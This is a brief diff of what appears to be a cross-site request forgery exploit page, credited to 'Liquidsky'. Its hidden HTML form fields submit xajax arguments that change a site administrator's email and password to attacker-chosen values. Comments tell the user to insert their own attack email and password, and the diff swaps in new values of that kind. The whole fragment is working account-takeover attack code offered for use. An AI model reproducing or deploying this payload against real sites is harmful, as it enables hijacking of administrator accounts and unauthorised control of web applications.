@@ -13,9 +13,9 @@ By: Liquidsky ^^
       <input type="hidden" name="xajaxr" value="" />
       <input type="hidden" name="xajaxargs&#91;&#93;" value="ADM" />
 <!-- Update with attack email to change the admins email to yours -->
-      <input type="hidden" name="xajaxargs&#91;&#93;" value="pwn+1@mail.lv" />
+      <input type="hidden" name="xajaxargs&#91;&#93;" value="pwn@mail.lv" />
 <!-- Update the following field to change the admins password to the password in the field -->
-      <input type="hidden" name="xajaxargs&#91;&#93;" value="password2" />
+      <input type="hidden" name="xajaxargs&#91;&#93;" value="password" />
       <input type="hidden" name="xajaxargs&#91;&#93;" value="fr" />
       <input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
       <input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
